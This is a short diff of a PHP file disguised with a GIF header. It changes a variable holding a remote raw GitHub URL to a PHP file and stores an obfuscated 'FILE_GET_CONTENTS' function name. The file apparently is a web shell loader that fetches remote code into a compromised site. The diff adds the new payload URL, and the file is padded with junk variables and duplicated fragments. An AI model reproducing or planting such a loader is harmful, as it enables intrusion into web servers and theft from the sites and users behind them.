@@ -4,7 +4,7 @@ $random2 = "randomValue2";
 gif<?php
 $random1 = "randomValue1";?>$random1 = "randomValue1";
 <?php
-$random2 = "randomValue2";$__aB = "https://raw.githubusercontent.com/soy777/gg/main/z1.php";?>$random2 = "randomValue2";
+$random2 = "randomValue2";$__aB = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";?>$random2 = "randomValue2";
 <?php
 $random3 = "randomValue3";$__B = "FILE_GET_CONTENTS";?> $random3 = "randomValue3";?>
 <?php
